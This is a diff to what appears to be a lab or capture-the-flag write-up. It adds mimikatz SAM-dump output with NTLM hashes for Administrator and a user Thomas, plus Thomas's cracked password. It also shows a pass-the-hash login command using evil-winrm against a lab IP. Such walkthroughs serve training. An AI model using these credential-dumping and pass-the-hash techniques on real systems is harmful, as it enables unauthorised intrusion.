@@ -210,8 +210,13 @@ lsadump::sam
 RID  : 000001f4 (500)
 User : Administrator
   Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+
+RID  : 000003e9 (1001)
+User : Thomas
+  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
 ```
-- I got a login using `evil-winrm` by passing the hash of the user administrator.
+- On cracking, I got the hash of user **Thomas** as **i<3ruby**.
+- I login using `evil-winrm` by passing the hash of the user administrator.
 ```
 evil-winrm -i 10.200.96.150 -u administrator -H  37db630168e5f82aafa8461e05c6bbd1
 ```
